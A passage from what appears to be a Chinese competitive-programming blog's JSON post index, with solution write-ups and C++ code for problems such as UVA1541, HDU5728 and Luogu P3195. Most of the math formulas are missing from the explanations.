T[k]) { j++; k++; if (T[j] != T[k]) { next[j] = k; } else { next[j] = next[k]; } } else { k = next[k]; }} 求法二 123456memset(next, 0, sizeof next);for (int i = 1; i &lt; m; i++) { int j = next[i]; while (j != 0 &amp;&amp; T[i] != T[j]) j = next[j]; next[i + 1] = (T[i] == T[j]) ? j + 1 : 0;} 两种写法的思想都是差不多的, 要利用已经求好的数组加速向前跳 求循环节 最后next[n]表示的就是整个字符串前后缀相等的长度 显然, 对于某个字符串T，长度为n，由长度为l的字符串s重复k次得到，当k &gt;= 2时必然有T.substr(0, n - l - 1) == T.substr(l, n - l - 1). 由于next表示的是前后缀的最长长度, 因此在已知T是循环串的情况下, 一个循环节的长度就是n - next[n]. 若T不是一个完美的循环串, 其最后一个循环节缺失了一部分, 以上写法依然可以得到正确的循环节长度, T再补上l - n % l的长度就是循环串了","tags":["oi","kmp"],"categories":["OI"]},{"title":"UVA1541 To Bet or Not To Bet","path":"/2019/6/4/UVA-1541/","content":"https://www.luogu.org/problemnew/show/UVA1541https://www.luogu.org/problemnew/show/UVA1541 题意 给定一个线性棋盘，每回合抛一次硬币，正面向前走一个，反面向前走两个。走到的格子上面可能有三种操作或者没有操作： 向前走格 向后走格 跳过下一回合（回合数++） 抛完硬币后就执行一次目标格的操作，只执行一次。 问在回合内走到终点或者终点之后的概率（输出格式见原题）。 分析 记忆化搜索，表示第步走到第格的概率。分类讨论抛硬币正面和反面的情况。 走一个的情况： 格是停一回合格不是停一回合 走两个的情况： 格是停一回合格不是停一回合 答案就是以上两个值的平均数。 代码 输入格式很恶心。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;cmath&gt;using namespace std;const int MAXN = 100;const char DOUBLE_MIN = 0xc2;const double EPS = 1e-8;bool bad[MAXN];int offset[MAXN];double dp[MAXN][MAXN];int n, t;double dfs(int i, int j) {\tif (dp[i][j] &gt;= 0) return dp[i][j];\tif (j == n + 1) return 1;\t// 走到了\tif (i &gt;= t) return 0;\t// 机会用完了没走到\tdp[i][j] = 0;\tif (bad[j + 1]) { dp[i][j] += dfs(i + 2, j + 1) / 2;\t} else { dp[i][j] += dfs(i + 1, j + 1 + offset[j + 1]) / 2;\t}\tint to = min(n + 1, j + 2);\t//特判跑出去的情况\tif (bad[to]) { dp[i][j] += dfs(i + 2, to) / 2;\t} else { dp[i][j] += dfs(i + 1, to + offset[to]) / 2;\t}\treturn dp[i][j];}int dcmp(double x, double y) {\tdouble c = x - y;\tif (c &gt; EPS) return 1;\tif (c &lt; -EPS) return -1;\treturn 0;}int main() {\tint tcnt;\tcin &gt;&gt; tcnt;\tfor (int T = 1; T &lt;= tcnt; T++) { cin &gt;&gt; n &gt;&gt; t; memset(bad, false, sizeof bad); memset(offset, 0, sizeof offset); memset(dp, 0xc2, sizeof dp); for (int i = 1; i &lt;= n; i++) { char opr[10]; scanf(\"%s\", opr); if (opr[0] == 'L') { bad[i] = true; } else { offset[i] = floor(atof(opr)); } } double ans = dfs(0, 0); switch(dcmp(ans, 0.5)) { case 1: printf(\"Bet for. %.4lf \", ans); break; case 0: printf(\"Push. %.4lf \", ans); break; case -1: printf(\"Bet against. %.4lf \", ans); break; }\t}}","tags":["题解","oi","概率dp"],"categories":["OI"]},{"title":"LightOJ1395 | UVA12411 A Dangerous Maze (II)","path":"/2019/6/1/LightOJ-1395/","content":"https://www.luogu.org/problemnew/show/UVA12411https://www.luogu.org/problemnew/show/UVA12411 题意 你在一个迷宫里，有条路，你每次选择一条，花费时间尝试走这条路，一些路会把你送到出口，另一些路会让你回到起点（已知），你不会走最近次走过的路口，问走出迷宫需要时间的期望，如果不能走出迷宫，输出 分析 首先，在期望的条件下，具体每个门的耗时是不重要的，我们只需知道平均每扇能走出去的门的耗时是，不能走出去的门的耗时是，出口有个，不是出口的有个。定义代表走了次后走出去的期望，代表最终走出来的期望（达到次后再多走都和原来是一样的了），那么 移项得 对于的情况，则令 再考虑不到步就走出去了的情况 最后答案就是 代码 考虑到精度问题，代码中的s1、s2是没有除的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;using namespace std;const int MAXN = 110;double dp[MAXN];int main() {\tint tcnt;\tcin &gt;&gt; tcnt;\tfor (int T = 1; T &lt;= tcnt; T++) { int n, k; cin &gt;&gt; n &gt;&gt; k; double s1 = 0, s2 = 0; int a = 0, b = 0; for (int i = 1; i &lt;= n; i++) { double x; cin &gt;&gt; x; if (x &gt; 0) { s1 += x; a++; } else { s2 -= x; b++; } } if (b == n) { printf(\"Case %d: %.3lf \", T, -1.0); continue; } if (k &gt;= b) { k = b; dp[k] = s1 / a; } else { dp[k] = s1 / a + ((b - k) * s2 / b) / a; } for (int i = k - 1; i &gt;= 0; i--) { dp[i] = (s1 + (b - i) * (s2 / b + dp[i + 1])) / (n - i); } printf(\"Case %d: %.3lf \", T, dp[0]);\t}}","tags":["题解","oi","概率dp"],"categories":["OI"]},{"title":"C++(Dev-Cpp附赠的Mingw32)的浮点数的坑","path":"/2019/5/22/Cpp-Float/","content":"昨天改考试题的错是发现标程有锅，造出来的数据是错误的，导致集体不过大样例。。。问题出在这一句话： 12double a = dbread();int64 b = a * 10; 这道题需要把输入的浮点数扩大十倍变成整数处理，请读程序写结果： 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;typedef long long int64;int main() { double orig = 10.1; cout &lt;&lt; \"original value: \" &lt;&lt; orig &lt;&lt; endl; int64 a = orig * 10; cout &lt;&lt; \"initialize directly: \" &lt;&lt; a &lt;&lt; endl; int64 b = (int64)((double)orig * 10.0); cout &lt;&lt; \"force cast: \" &lt;&lt; b &lt;&lt; endl; int64 c = floor(orig * 10); cout &lt;&lt; \"floor: \" &lt;&lt; c &lt;&lt; endl; int64 d = ceil(orig * 10); cout &lt;&lt; \"ceil: \" &lt;&lt; d &lt;&lt; endl; orig *= 10; int64 e = orig; cout &lt;&lt; \"multiply then initialize: \" &lt;&lt; e &lt;&lt; endl;} 猜猜输出是什么(用学校电脑Dev-Cpp编译)？ 123456original value: 10.1initialize directly: 100force cast: 100floor: 101ceil: 101multiply then initialize: 101 惊不惊喜意不意外？精度误差不会这么明显吧！吓得我用自己的电脑(g++.exe (x86_64-posix-seh-rev0, Built by MinGW-W64 project) 8.1.0)试了一下： 123456original value: 10.1initialize directly: 101force cast: 101floor: 101ceil: 101multiply then initialize: 101 怎么又正常了？在Ubuntu 18.04中结果也是正常的。也不会是32位64位的锅，因为标程在64位的评测机上也是错的。那就只可能是这个Mingw32的锅了，这还能解释为什么标程在UVa上能A。Dev-Cpp真是害人不浅啊！ 保险起见，以后处理double转整型是，还是加一个EPS比较妥当。","tags":["oi"],"categories":["OI"]},{"title":"UVA11768 Lattice Point or Not","path":"/2019/5/21/UVa-11768/","content":"https://www.luogu.org/problemnew/show/UVA11768https://www.luogu.org/problemnew/show/UVA11768 洛谷水黑题，不过考试的时候把我坑惨了，推了一个半小时都没有推出来，太弱了。。。 题意 在二维坐标系中给定两个点和，, , , 均为的整数倍，求线段经过多少个格点。 分析 给出的是两点坐标求直线，应该用直线的两点式方程入手。 交叉相乘整理得一般式 求这样的式子的整数解，显然需要exgcd。但是题目给出的是小数，还好只有一位，坐标都扩大十倍。 写代码时不要忘了乘上红色的系数！ 然后exgcd常规操作，求出直线上的一个整点 并且其它整点满足 这样求出来的点保证在直线上，我们就不用考虑y坐标，只用管x坐标了。 x坐标上整点出现的周期是，将移动到目标区间开头： 1int64 xbegin = x + (l - x) / xrep * xrep; 答案就是 1(r - xbegin) / xrep + 1 代码 注意特判两点式不成立的情况：平行于坐标轴。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;cmath&gt;#include &lt;fstream&gt;#include &lt;cctype&gt;using namespace std;typedef long long int64;const int64 INF = 0x3f3f3f3f3f3f3f3fll;int64 exgcd(int64 a, int64 b, int64 &amp;x, int64 &amp;y) { if (!b) { x = 1; y = 0; return a; } int64 GCD = exgcd(b, a % b, x, y); int64 tmp = x; x = y; y = tmp - a / b * y; return GCD;}inline double dbread() { double X = 0, Y = 1.0; int w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) X = X * 10 + (ch ^ 48), ch = getchar(); ch = getchar(); while (isdigit(ch)) X += (Y /= 10) * (ch ^ 48), ch = getchar(); return w ? -X : X;}int main() {\tint tcnt;\tcin &gt;&gt; tcnt;\tfor (int T = 1; T &lt;= tcnt; T++) { double x1 = dbread(); double y1 = dbread(); double x2 = dbread(); double y2 = dbread(); int64 X1 = x1 * 10, X2 = x2 * 10, Y1 = y1 * 10, Y2 = y2 * 10; if (x1 == x2) { if (X1 % 10 != 0) { cout &lt;&lt; 0 &lt;&lt; endl; } else { if (y2 &lt; y1) { swap(y1, y2); } cout &lt;&lt; floor(y2) - ceil(y1) + 1 &lt;&lt; endl; } } else if (y1 == y2) { if (Y1 % 10 != 0) { cout &lt;&lt; 0 &lt;&lt; endl; } else { if (x2 &lt; x1) { swap(x2, x1); } cout &lt;&lt; floor(x2) - ceil(x1) + 1 &lt;&lt; endl; } } else { int64 A = (Y2 - Y1) * 10, B = (X1 - X2) * 10; int64 C = Y2 * X1 - Y1 * X2; int64 x, y; int64 GCD = exgcd(A, B, x, y); if (C % GCD != 0) { cout &lt;&lt; 0 &lt;&lt; endl; } else { x = x * C / GCD; int64 xrep = abs(B / GCD); if (x1 &gt; x2) { swap(x1, x2); } int64 l = ceil(x1); int64 r = floor(x2); if (l &lt;= r) { int64 xbegin = x + (l - x) / xrep * xrep; if (xbegin &lt; l) { xbegin += xrep; } if (xbegin &gt; r) { cout &lt;&lt; 0 &lt;&lt; endl; } else { cout &lt;&lt; (r - xbegin) / xrep + 1 &lt;&lt; endl; } } else { cout &lt;&lt; 0 &lt;&lt; endl; } } }\t}}","tags":["题解","oi","数论","exgcd"],"categories":["OI"]},{"title":"HDU5728 PowMod","path":"/2019/5/11/HDU-5728/","content":"http://acm.hdu.edu.cn/showproblem.php?pid=5728http://acm.hdu.edu.cn/showproblem.php?pid=5728 由于posts.json的BUG文章详情省略，不过这是道好题 题意 给定，保证没有平方因子，定义 求 分析 k的计算 欧拉函数的定义：小于的正整数中与互质的数的数目，。欧拉函数是积性函数，即满足： 以此可以推出它的通式（证明略）： 是的质因数 利用它的通式可以得到 是的质因数 故考虑时，如果与互质，就可以直接用积性函数的性质来求。如果与不互质：令是的一个质因子，由于没有平方因子， 那么，如果没有因子，就用积性函数求；而如果是的倍数，就用上面那条性质把拿出来。 注意当是质数时 此时考虑后两项中的意义：中间一项中的倍数对应最后一项中恰好取完了1到m的所有值，故可以合并： 此时如果把与看做整体，设，有 计算时每次枚举n的一个质因子。 计算k的无限次幂 欧拉定理： 可以推出指数循环节公式： 当c是质数时，，根据费马小定理有 不过上面那个式子与本题无关，本题中那个无限次幂每向上计算一次就会取一个欧拉函数，最后模数会越取越小变成1，膜1结果是0就跳出死循环了。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int MAXA = 1e7 + 10;const int AMXA = 1e7;const int64 MOD = 1000000007;int prime[MAXA], prime_cnt;bool isntp[MAXA];int64 phi[MAXA], sum_phi[MAXA];void init_phi() { phi[1] = 1; for (int i = 2; i &lt;= AMXA; i++) { if (!isntp[i]) { prime[++prime_cnt] = i; phi[i] = i - 1; } for (int j = 1; j &lt;= prime_cnt &amp;&amp; i * prime[j] &lt;= AMXA; j++) { isntp[i * prime[j]] = true; if (i % prime[j] == 0) { phi[i * prime[j]] = phi[i] * prime[j]; break; } else { phi[i * prime[j]] = phi[i] * (prime[j] - 1); } } }}template &lt;typename T&gt;T pow_mod(T a, T b, T MOD) { T res = 1; while (b) { if (b &amp; 1) res = res * a % MOD; a = a * a % MOD; b /= 2; } return res;}int factors[50], fac_cnt;int64 f(int64 n, int64 m, int facid) { if (n == 1) { return sum_phi[m]; } if (m == 0) { return 0; } return ((factors[facid] - 1) * f(n / factors[facid], m, facid - 1) % MOD + f(n, m / factors[facid], facid) % MOD) % MOD;}int64 get_pow(int64 k, int64 p) { if (p == 1) { return 1; } int64 tmp = pow_mod(k, get_pow(k, phi[p]), p); return (tmp == 0) ? p : tmp;}int main() { init_phi(); for (int i = 1; i &lt;= AMXA; i++) { sum_phi[i] = sum_phi[i - 1] + phi[i]; sum_phi[i] %= MOD; } int64 n, m, p; while (cin &gt;&gt; n &gt;&gt; m &gt;&gt; p) { // fac_cnt = 0; // if (isntp[n]) { // for (int i = 1; i &lt;= prime_cnt &amp;&amp; prime[i] * prime[i] &lt;= n; i++) // { // if (n % prime[i] == 0) { // factors[++fac_cnt] = prime[i]; // if (!isntp[n / prime[i]]) { // factors[++fac_cnt] = n / prime[i]; // } // } // } // } else { // factors[++fac_cnt] = n; // } fac_cnt = 0; int64 tmp = n; for (int i = 1; i &lt;= prime_cnt; i++) { if (!isntp[tmp]) { factors[++fac_cnt] = tmp; break; } else { if (tmp % prime[i] == 0) { factors[++fac_cnt] = prime[i]; tmp /= prime[i]; } } } int64 k = f(n, m, fac_cnt); cout &lt;&lt; get_pow(k, p) &lt;&lt; endl; }}","tags":["题解","oi","数论","欧拉函数"],"categories":["OI"]},{"title":"HDU5812 Distance","path":"/2019/5/11/HDU-5812/","content":"http://acm.hdu.edu.cn/showproblem.php?pid=5812http://acm.hdu.edu.cn/showproblem.php?pid=5812 题意 给出一个空集合和三个操作。操作I向集合中插入元素X，操作D删除集合中的元素X，操作Q，查询集合中的所有元素与X的最小距离是多少？ 定义最小距离为从x变为y只通过乘或者除素数所需要的最少操作次数。例如：，因为 分析 定义表示x的质因数个数，易知 由于，所以可以预处理出pfac。 对于每次查询，可以暴力枚举x的因数作为两数的GCD，()，然后再枚举这个GCD的倍数作为另外一个数，判断这个数在集合里面是否存在，再更新ans。 但是这样跑不过。考虑到不会超过20，聪明一些的做法是开一个数组cnt[i][j]，表示当前集合中满足含有因数i，同时含有的除了i后质因数数量是j的数的数目，就可以在插入和删除时维护cnt数组，查询时对于x的每一个因数枚举j就完了。总时间复杂度 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;set&gt;using namespace std;const int MAXN = 200010;const int MAXA = 1000010;const int AMXA = 1000000;const int INF = 0x3f3f3f3f;int prime[MAXA];int prime_cnt;bool isntp[MAXA];int pcnt[MAXA];void count_factor() {\tpcnt[1] = 0;\tfor(int i = 2;i&lt;=AMXA;i++){ if(!isntp[i]){ prime[++prime_cnt] = i; pcnt[i] = 1; } for(int j = 1;j&lt;=prime_cnt &amp;&amp; i*prime[j] &lt;= AMXA;j++){ isntp[i*prime[j]] = true; pcnt[i*prime[j]] = pcnt[i] + 1; if(i % prime[j] == 0){ break; } }\t}}set&lt;int&gt; s;int c[MAXA][20];void add(int x){\tfor(int i = 1;i*i &lt;= x;i++){ if(x % i == 0){ c[i][pcnt[x/i]]++; if(i*i != x){ c[x/i][pcnt[i]]++; } }\t}}void del(int x){\tfor(int i = 1;i*i &lt;= x;i++){ if(x % i == 0){ c[i][pcnt[x/i]]--; if(i*i != x){ c[x/i][pcnt[i]]--; } }\t}}int main(){\tcount_factor();\tint q;\tint T = 0;\twhile((cin &gt;&gt; q) &amp;&amp; q &gt; 0){ cout &lt;&lt; \"Case #\" &lt;&lt; ++T &lt;&lt; \":\" &lt;&lt; endl; s.clear(); memset(c,0,sizeof c); for(int i = 1;i&lt;=q;i++){ char opr[5]; int x; scanf(\"%s%d\",opr,&amp;x); switch(opr[0]){ case 'I': if(s.count(x) == 0){ s.insert(x); add(x); } break; case 'D': if(s.count(x) &gt; 0){ s.erase(x); del(x); } break; case 'Q': if(s.size() == 0){ cout &lt;&lt; -1 &lt;&lt; endl; break; } int ans = INF; for(int i = 1;i*i&lt;=x;i++){ if(x % i == 0){ for(int j = 0;j&lt;20;j++){ if(c[i][j] &gt; 0){ ans = min(ans,pcnt[x/i] + j); } if(c[x/i][j] &gt; 0){ ans = min(ans,pcnt[i] + j); } } } } cout &lt;&lt; ans &lt;&lt; endl; break; } }\t}}","tags":["题解","oi","数论"],"categories":["OI"]},{"title":"HDU3398 String","path":"/2019/5/11/HDU-3398/","content":"http://acm.hdu.edu.cn/showproblem.php?pid=3398http://acm.hdu.edu.cn/showproblem.php?pid=3398 有毒。。。谁想得到要这样做。。。 题意 一个字符串只由0，1组成，且0有m个，1有n个，要求该字符串中任意的前缀中1的个数不能小于0的个数，问这样的字符串一共有多少个。结果对20100501取膜。 分析 首先总方案数是，考虑不合法方案数。 此处有一个很有意思的抽象（谁想得到啊），就是在平面直角坐标系中，从开始，在字符串中遇到0就向右走1，遇到1就向上走1，最后要走到。那么，合法的路径一定不会与直线即相交，不合法的路径就一定会与它相交。 但是这样还是没法求，因为起点和终点都在直线的同侧。我们可以找到关于的对称点，这样从出发到的所有路线（取一个对称就是原来的路径）就会与直线相交了，可以直接用排列组合的公式（相当于问从走到的路线数）求得不合法路径数为。 故最终答案是 膜质数意义下的组合数可用卢卡斯定理快速求出 可是20100501不是质数。展开上式得 有除法，不能用逆元。应该用唯一分解定理对上下约分再把素因子乘起来。 阶乘的质因数分解 对于n的阶乘中数x的次数，1到n中含有x的一次项的有共计个，以此类推，含有二次项的有个，含有三次项的有个……最终想的次数就是以上数列求和，可以递推解决。 12345678int count_fact(int n, int x) { int ret = 0; while (n &gt; 0) { n /= x; ret += n; } return ret;} 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int MAXN = 1e6+10;const int MAXA = 2e6+10;const int64 MOD = 20100501;const int AMXA = 2e6;int64 prime[MAXN];bool isntp[MAXA];int pcnt;void make_prime() { pcnt = 0; memset(isntp, false, sizeof(isntp)); for (int i = 2; i &lt; AMXA; ++i) { if (!isntp[i]) { prime[++pcnt] = i; } for (int j = 1; j &lt;= pcnt; ++j) { if (i * prime[j] &gt; AMXA) { break; } isntp[i * prime[j]] = true; if (i % prime[j] == 0) { break; } } }}template &lt;typename T&gt;T pow_mod(T a, T b, T MOD) { T res = 1; while (b) { if (b &amp; 1) res = res * a % MOD; a = a * a % MOD; b /= 2; } return res;}int64 count_fact(int64 n, int64 x) { int64 ret = 0; while (n &gt; 0) { n /= x; ret += n; } return ret;}int main(){\tmake_prime();\tint tcnt;\tcin &gt;&gt; tcnt;\tfor(int T = 1;T&lt;=tcnt;T++){ int n,m; cin &gt;&gt; n &gt;&gt; m; int64 ans = 1; int64 res = n-m+1;\t//原式中n-m+1项 for(int i = 1;i&lt;=pcnt &amp;&amp; prime[i] &lt;= (m+n);i++){ int64 cnt = 0; while(res % prime[i] == 0){ cnt++; res /= prime[i]; } cnt += count_fact(n+m,prime[i]); cnt -= count_fact(m,prime[i]); cnt -= count_fact(n+1,prime[i]); ans *= pow_mod(prime[i],cnt,MOD); ans %= MOD; } cout &lt;&lt; ans &lt;&lt; endl;\t}}","tags":["题解","oi","数论"],"categories":["OI"]},{"title":"CF615D Multipliers","path":"/2019/5/10/Codeforces-615D/","content":"https://www.luogu.org/problemnew/show/CF615Dhttps://www.luogu.org/problemnew/show/CF615D 垃圾JSON！！！有空去把/posts.json改成/posts.xml，JSON的转义符太恶心了。以上是吐槽。 题意 给你一个数，输出其所有因数的乘积。这个数以质因子乘积的形式给出。答案膜， 分析 首先肯定要对n质因数分解已经分好了，只用把相同的因子合并一下指数，记做tim[i]，表示第i个质因子的次数。 我们单独考虑每个质因子对答案的贡献，则答案是Double subscripts: use braces to clarify\\prod p_i^k_i，即因数在所有因子里的出现次数，显然 相当于 指数很大，用一下指数循环节公式： 但是！等差数列求和公式里面除了个2，而不与2互质，取不了膜！ ZML老师给了我们一个神奇的公式： 可是我并不会证明它，网上也查不到证明。不过就与2互质了嘛，计算过程中膜它，最后再膜就是了。 另外一种做法是直接用前后缀积来算，就可以避免这个除2的问题了(前缀和在指数上，对MOD-1取膜) 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int MAXN = 200010;const int64 MOD = 1e9+7;int vcnt[MAXN];int cnt[MAXN];int64 prime[MAXN];//int64 sum1[MAXN];//int64 sum2[MAXN];template &lt;typename T&gt;T pow_mod(T a, T b, T MOD) { T res = 1; while (b) { if (b &amp; 1) res = res * a % MOD; a = a * a % MOD; b &gt;&gt;= 1; } return res;}int main(){\tint n;\tcin &gt;&gt; n;\tfor(int i = 1;i&lt;=n;i++){ int p; cin &gt;&gt; p; vcnt[p]++;\t}\tint pcnt = 0;\tfor(int i = 1;i&lt;=200000;i++){ if(vcnt[i] &gt; 0){ cnt[++pcnt] = vcnt[i]; prime[pcnt] = i; }\t}//\tsum1[0] = sum1[pcnt+1] = sum2[0] = sum2[pcnt+1] = 1;//\tfor(int i = 1;i&lt;=pcnt;i++){// sum1[i] = sum1[i-1] * (cnt[i] + 1);// sum1[i] %= MOD - 1;//\t}//\tfor(int i = pcnt;i&gt;=1;i--){// sum2[i] = sum2[i+1] * (cnt[i] + 1);// sum2[i] %= MOD - 1;//\t}\tint64 prod = 1;\tfor(int i = 1;i&lt;=pcnt;i++){ prod *= (cnt[i] + 1); prod %= MOD*2 - 2;\t}\tint64 ans = 1;\tfor(int i = 1;i&lt;=pcnt;i++){// int64 k = (sum1[i-1] * sum2[i+1]);// k %= MOD - 1;// k *= cnt[i] * (cnt[i] + 1) / 2;// k %= MOD - 1; int64 k = prod * cnt[i] % (MOD*2 - 2) / 2; ans *= pow_mod(prime[i],k,MOD); ans %= MOD;\t}\tcout &lt;&lt; ans &lt;&lt; endl;}","tags":["题解","oi","数论","组合数学"],"categories":["OI"]},{"title":"SPOJ4191 POJ3904 Sky Code","path":"/2019/5/10/SPOJ-4191/","content":"https://www.luogu.org/problemnew/show/SP4191https://www.luogu.org/problemnew/show/SP4191 最近学业繁忙，好久没有搞过OI了。。。 题意 给你n个数，现在让你求出有多少个四元组，满足这四个数的最大公约数等于1,,,多组询问，对于每个询问回答多少个四元组满足条件。 分析 用总方案数（）减去不合法方案数更容易。于是可以预处理出每一个的取值包含多少个不同的质因子数，再看每个取值上有多少个原数组中的取值的因子（考虑每个取值作为四个数GCD的值）。最后统计时要排除有超过两个相同质因子的数，防止重复统计。 容斥原理是奇加偶减，这里因为是用总数减，变成奇减偶加。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int MAXN = 10010;const int AMXA = 10000;int64 C4(int64 n){ return n*(n-1)*(n-2)*(n-3) / 24;}int prime[MAXN];bool isntp[MAXN];int pcnt;int pfac_cnt[MAXN];void count_factor(){ for(int i = 2;i&lt;=AMXA;i++){ if(!isntp[i]){ prime[pcnt++] = i; pfac_cnt[i] = 1; for(int j = i*2;j&lt;=AMXA;j+=i){ isntp[j] = true; if(j % (i*i) != 0 &amp;&amp; pfac_cnt[j] != -1){ pfac_cnt[j]++; }else{ pfac_cnt[j] = -1; } } } }}int a[MAXN];int vcnt[MAXN];int all_fac[MAXN];int main(){ int n; count_factor(); while(cin &gt;&gt; n){ memset(vcnt,0,sizeof vcnt); memset(all_fac,0,sizeof all_fac); for(int i = 1;i&lt;=n;i++){ cin &gt;&gt; a[i]; vcnt[a[i]]++; } for(int i = 2;i&lt;=AMXA;i++){ for(int j = i;j&lt;=AMXA;j+=i){ all_fac[i] += vcnt[j]; } } int64 ans = C4(n); for(int i = 2;i&lt;=AMXA;i++){ if(pfac_cnt[i] &gt; 0){ if(pfac_cnt[i] &amp; 1){ ans -= C4(all_fac[i]); }else{ ans += C4(all_fac[i]); } } } cout &lt;&lt; ans &lt;&lt; endl; }}","tags":["题解","oi","数论","容斥原理"],"categories":["OI"]},{"title":"洛谷P2607 [ZJOI2008]骑士","path":"/2019/4/13/Luogu-P2607/","content":"https://www.luogu.org/problemnew/show/P2607https://www.luogu.org/problemnew/show/P2607 经典题，n个点n条边的图一定是一个基环树森林，于是可以先DFS一遍把环找出来，再断环（在环上随便找一条边，强制两个端点之一不选），就变成了一个没有上司的舞会了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;typedef long long int64;const int MAXN = 1e6+10;const int INF = 0x3f3f3f3f;class lfs { public: int w[MAXN]; lfs(int N) { memset(head, -1, sizeof head); memset(e,0,sizeof e); ecnt = 0; n = N; } void adde(int from, int to) { e[ecnt].to = to; e[ecnt].next = head[from]; head[from] = ecnt++; } void addde(int a, int b) { adde(a, b); adde(b, a); } int64 solve(){ memset(vis,false,sizeof vis); memset(dp,0,sizeof dp); int64 ans = 0; for(int i = 1;i&lt;=n;i++){ if(!vis[i]){ dfs1(i,0); dfs2(e[edge_to_break].to,0); int64 now = dp[e[edge_to_break].to][0]; dfs2(e[edge_to_break^1].to,0); now = max(now,dp[e[edge_to_break^1].to][0]); ans += now; } } return ans; } protected: struct Edge { int to, next; } e[MAXN * 2]; int head[MAXN]; int ecnt; int n; private: bool vis[MAXN]; int64 dp[MAXN][2]; int edge_to_break; void dfs1(int u,int fa) { vis[u] = true; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v != fa) { if(vis[v]){ edge_to_break = i; continue; // &lt;============!!! } dfs1(v,u); } } } void dfs2(int u, int fa) { dp[u][0] = 0; dp[u][1] = w[u]; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v != fa &amp;&amp; i != edge_to_break &amp;&amp; (i^1) != edge_to_break) { dfs2(v, u); dp[u][0] += max(dp[v][0],dp[v][1]); dp[u][1] += dp[v][0]; } }// clog &lt;&lt; \"dp[\" &lt;&lt; u &lt;&lt; \"][0] = \" &lt;&lt; dp[u][0] &lt;&lt; endl;// clog &lt;&lt; \"dp[\" &lt;&lt; u &lt;&lt; \"][1] = \" &lt;&lt; dp[u][1] &lt;&lt; endl; }};#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main(){//\tfreopen(\"data\",\"r\",stdin); int n = read(); lfs* tree = new lfs(n); for(int i = 1;i&lt;=n;i++){ tree-&gt;w[i] = read(); tree-&gt;addde(i,read()); } cout &lt;&lt; tree-&gt;solve() &lt;&lt; endl;} 有一个细节问题是标记处的continue，如果改为return就会引起无限递归爆栈，不知道为什么。","tags":["题解","oi","dp"],"categories":["OI"]},{"title":"洛谷P3195 [HNOI2008]玩具装箱TOY","path":"/2019/4/13/Luogu-P3195/","content":"https://www.luogu.org/problemnew/show/P3195https://www.luogu.org/problemnew/show/P3195 经典的一道斜率优化DP,很久以前写的,现在再拿出来复习一下 简单读题可以得出本题的DP方程是 但是这样转移的复杂度高达,5e4的数据不能接受,需要优化. 为了简便计算,令. 假设存在决策和(),使得比更优,则有 展开式子得 移项 把变量除过去 为了看得更清楚,再令 经过这样的变换,这个DP方程就有了个斜率样子了:如果把看做纵坐标,把看做横坐标,那么就是过这两点的直线的斜率. 再重申一遍,只要满足上面这个式子(考虑每一个i时,左侧是一个常量!),决策k就比决策j更优. 由于是单调递增的,所以如果我们把对应的点依次绘制在坐标系上,就会构成一个函数(随便想一个函数的图像).每当我们将一个点从右侧连接到这个图像上是,就可以知道它与上一个点之间的斜率,再比较上上个点与上一个点的斜率,如果这两个斜率是递减的,说明当前决策一定更有可能比上一个决策最优! 这像不像一个单调队列?我们已经有了进队的条件了,可以维护一个优秀程度递增(在j递增的基础上)的单调队列了. 那么出队呢?很好的是,也是单调递增的.所以我们只要把当前看起来不会更优的点(队首斜率大于时)出队,让当前可以更优的点成为队首. 所以像这样能用单调队列解决的关键点: 能把两个决策点优劣的关系式化成斜率式 式子左边对i具有单调性 式子右边视作x坐标的项对j具有单调性 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int MAXN = 50050;int64 a[MAXN];int64 n,L;int64 sum[MAXN],s[MAXN],h[MAXN];int64 que[MAXN];int64 dp[MAXN];double cal(int j,int k){ return (double)(dp[k]-dp[j] + 